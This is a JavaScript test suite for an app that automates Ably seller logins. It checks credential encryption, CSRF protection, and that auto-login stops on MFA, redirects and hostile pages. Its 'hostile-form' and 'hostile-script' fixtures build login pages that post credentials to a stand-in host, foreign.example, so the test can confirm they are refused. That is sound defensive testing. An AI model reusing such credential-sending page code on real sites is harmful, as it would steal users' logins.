import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, readFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { once } from 'node:events';
import { chromium } from 'playwright-core';
import { AuthVault } from '../src/auth-vault.js';
import { loginAblyWithCredentials, ABLY_LOGIN_ENDPOINT, ABLY_ORIGIN } from '../src/ably-login.js';
import { AblyConnector, ABLY_REVIEW_URL } from '../src/ably.js';
import { AutoLogin } from '../src/auto-login.js';
import { SerialQueue } from '../src/core.js';
import { createApp } from '../src/server.js';
import { cleanupTestDirectory } from './cleanup.js';
const credentials = { method: 'ably', username: 'ably-fixture@example.invalid', password: 'test-ably-password"only!' };

test('Ably credentials are encrypted separately and survive restart without leaking to responses', { skip: process.platform !== 'win32' }, async t => {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'review-http-test-')); t.after(() => cleanupTestDirectory(directory));
  const naver = new AuthVault(directory), coupang = new AuthVault(directory, undefined, { platform: 'coupang' }), ably = new AuthVault(directory, undefined, { platform: 'ably' });
  for (const vault of [naver, coupang, ably]) await vault.init();
  await naver.save({ enabled: true, ...credentials, method: 'naver' }); await coupang.save({ enabled: true, ...credentials, method: 'coupang' });
  const naverBefore = await readFile(naver.file, 'utf8'), coupangBefore = await readFile(coupang.file, 'utf8');
  await ably.save({ enabled: true, ...credentials }); const stored = await readFile(ably.file, 'utf8');
  assert.equal(stored.includes(credentials.password), false); assert.equal(stored.includes(credentials.username), false);
  assert.equal(JSON.stringify(ably.publicState()).includes(credentials.username), false);
  const restarted = new AuthVault(directory, undefined, { platform: 'ably' }); await restarted.init(); assert.deepEqual(await restarted.credentials(), credentials);
  await assert.rejects(restarted.save({ enabled: true, ...credentials, method: 'naver' }));
  await restarted.save({ enabled: false }); assert.equal(await restarted.credentials(), null); await restarted.forget();
  assert.equal(await readFile(naver.file, 'utf8'), naverBefore); assert.equal(await readFile(coupang.file, 'utf8'), coupangBefore);
});

test('Ably official form submits once and stops for MFA, invalid credentials, redirects and unknown destinations', async t => {
  const browser = await chromium.launch({ channel: 'chrome', headless: true }); t.after(() => browser.close());
  for (const scenario of ['success', 'mfa', 'pre-mfa', 'invalid', 'hostile-form', 'hostile-script', 'redirect']) await t.test(scenario, async () => {
    const context = await browser.newContext({ serviceWorkers: 'block' }); let submissions = 0;
    await context.route('**/*', async route => {
      const request = route.request(), url = new URL(request.url());
      if (request.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: { 'Access-Control-Allow-Origin': ABLY_ORIGIN, 'Access-Control-Allow-Headers': 'content-type', 'Access-Control-Allow-Methods': 'POST' } });
      if (url.origin !== ABLY_ORIGIN || request.method() !== 'GET') return route.abort();
      if (url.pathname === '/reviews') return route.fulfill({ contentType: 'text/html', body: '<a href="/seller">테스트 마켓</a>' });
      const action = scenario === 'hostile-form' ? ' action="https://foreign.example/receive"' : '';
      const form = `<form class="login-form"${action}><input name="email"><input name="password" type="password"><button type="button" class="login-form__login-button">로그인</button></form>`;
      const target = scenario === 'hostile-script' ? 'https://foreign.example/receive' : ABLY_LOGIN_ENDPOINT;
      const outcome = scenario === 'mfa' ? "document.body.innerHTML='<p>인증번호를 입력하세요</p><input autocomplete=one-time-code>'" : scenario === 'invalid' ? "document.body.innerHTML='<p>아이디 또는 비밀번호가 일치하지 않습니다.</p>'" : `location.href=${JSON.stringify(ABLY_REVIEW_URL)}`;
      const script = `<script>document.querySelector('button').onclick=async()=>{try{const r=await fetch(${JSON.stringify(target)},{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:document.querySelector('[name=email]').value,password:document.querySelector('[name=password]').value})});await r.json();${outcome}}catch{}};</script>`;
      await route.fulfill({ contentType: 'text/html; charset=utf-8', body: scenario === 'pre-mfa' ? '<p>보안 문자를 입력하세요</p><input id="captcha">' : form + script });
    });
    try {
      const page = await context.newPage(); await page.goto(ABLY_ORIGIN + '/login');
      // Simulate the network response in the guard itself. Synthetic credentials never leave this test.
      const realRoute = page.route.bind(page), realUnroute = page.unroute.bind(page), wrappers = new Map();
      page.route = async (pattern, handler) => {
        const wrapped = route => handler({ request: () => route.request(), continue: () => route.fallback(), abort: () => route.abort(),
          fetch: async options => { assert.equal(options.maxRedirects, 0); submissions++; assert.deepEqual(route.request().postDataJSON(), { email: credentials.username, password: credentials.password }); return { status: () => scenario === 'redirect' ? 307 : scenario === 'invalid' ? 401 : 200, dispose: async () => {} }; },
          fulfill: ({ response }) => route.fulfill({ status: response.status(), contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': ABLY_ORIGIN }, body: '{}' }),
        }); wrappers.set(handler, wrapped); return realRoute(pattern, wrapped);
      };
      page.unroute = (pattern, handler) => realUnroute(pattern, wrappers.get(handler));
      const connector = { open: async () => {}, getPage: async () => page, status: async () => ({ connected: page.url() === ABLY_REVIEW_URL }) };
      if (scenario === 'hostile-form') { await assert.rejects(loginAblyWithCredentials(connector, credentials, { timeout: 4000 }), /Unrecognized Ably login destination/); assert.equal(await page.locator('[name=password]').inputValue(), ''); }
      else {
        const result = await loginAblyWithCredentials(connector, credentials, { timeout: 4000 });
        if (scenario === 'success') assert.equal(result.connected, true);
        else assert.equal(result.reason, ['mfa', 'pre-mfa'].includes(scenario) ? 'verification' : scenario === 'invalid' ? 'invalid_credentials' : 'connection_error');
        if (scenario === 'hostile-script' || scenario === 'redirect') assert.equal(await page.locator('[name=password]').inputValue(), '');
      }
      assert.equal(submissions, ['pre-mfa', 'hostile-form', 'hostile-script'].includes(scenario) ? 0 : 1);
    } finally { await context.close(); }
  });
});

test('Ably status does not trust stale headers after expiry and network failures do not submit credentials', async () => {
  let requests = 0, responseStatus = 200, offline = false;
  const connector = new AblyConnector('unused');
  const page = { context: () => ({ request: { get: async () => { requests++; if (offline) throw new Error('offline'); return { status: () => responseStatus, json: async () => ({ reviews: [], total_count: 0 }), dispose: async () => {} }; } } }) };
  connector.getPage = async () => page; connector.storeName = async () => '테스트'; connector.workspace = async () => ({ page, store: '테스트', authorization: 'test-only' });
  assert.equal((await connector.status()).connected, true); await connector.status(); assert.equal(requests, 1);
  responseStatus = 401; assert.equal((await connector.status(true)).connected, false); assert.equal(connector.session, null);
  offline = true; assert.equal((await connector.status(true)).networkError, true);
  const vault = { publicState: () => ({ enabled: true }), block: async () => assert.fail('No credential attempt during network failure') };
  connector.login = async () => assert.fail('Network failure must not submit credentials');
  const auth = new AutoLogin(connector, vault, new SerialQueue()); await auth.schedule(); assert.equal(auth.phase, 'offline');
});

test('Ably auth HTTP routes require CSRF, preserve other platforms and never publish reviews', async t => {
  const directory = await mkdtemp(path.join(os.tmpdir(), 'review-http-test-')), port = 14323, base = `http://127.0.0.1:${port}`;
  const connector = { status: async () => ({ connected: true }), publish: async () => assert.fail('No posting') };
  const ablyConnector = { status: async () => ({ connected: true }), login: async () => assert.fail('Already connected') };
  const { server, store, csrf, autoLogin, coupangAutoLogin, ablyAutoLogin } = await createApp({ directory, connector, coupangConnector: connector, ablyConnector, port, maintenanceInterval: 0 });
  server.listen(port, '127.0.0.1'); await once(server, 'listening');
  t.after(async () => { server.closeAllConnections(); await new Promise(resolve => server.close(resolve)); await cleanupTestDirectory(directory); });
  const post = (route, data, token = csrf) => fetch(base + route, { method: 'POST', headers: { Origin: base, 'X-Review-Token': token, 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
  assert.equal((await post('/api/auth/ably/settings', { enabled: true, ...credentials }, 'bad')).status, 403);
  assert.equal((await post('/api/auth/ably/settings', { enabled: true })).status, 400);
  const response = await post('/api/auth/ably/settings', { enabled: true, ...credentials }); assert.equal(response.status, 200); assert.equal((await response.json()).configured, true); await ablyAutoLogin.pending;
  const status = await fetch(base + '/api/status').then(r => r.json()); assert.equal(status.platforms.ably.autoLogin.enabled, true); assert.equal(autoLogin.publicState().configured, false); assert.equal(coupangAutoLogin.publicState().configured, false);
  for (const route of ['/api/session', '/api/status', '/api/reviews']) { const body = await fetch(base + route).then(r => r.text()); assert.equal(body.includes(credentials.username), false); assert.equal(body.includes(credentials.password), false); }
  assert.equal(JSON.stringify(store.data).includes(credentials.username), false); assert.equal((await fetch(base + '/.local/ably-auth.json')).status, 404);
  assert.equal((await post('/api/auth/ably/forget', {}, 'bad')).status, 403); assert.equal((await post('/api/auth/ably/forget', {}).then(r => r.json())).configured, false);
});
